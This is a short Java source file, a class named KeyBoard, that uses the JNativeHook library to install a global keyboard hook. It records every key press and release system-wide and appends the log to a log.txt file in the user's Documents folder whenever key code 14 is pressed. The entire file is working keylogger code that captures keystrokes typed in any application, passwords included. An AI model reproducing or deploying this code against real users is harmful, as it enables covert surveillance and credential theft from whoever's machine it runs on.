package com;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeyBoard implements NativeKeyListener{
    String input = "";
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.err.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
        input += "Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()) + "\n";
        if (e.getKeyCode() == 14) {
            try {
                Path LOG_FILE = Path.of(System.getProperty("user.home"), "Documents", "log.txt");
                Files.writeString(
                LOG_FILE, 
                input, 
                StandardOpenOption.CREATE,
                StandardOpenOption.APPEND
                );
                input = "";
            } catch (Exception f) {
                f.printStackTrace();
            }
            
        }
    }
    public void nativeKeyReleased(NativeKeyEvent e) {
        input += "Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()) + "\n";

    }
    public static void main(String[] args) throws NativeHookException {
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(new KeyBoard());
    }
}
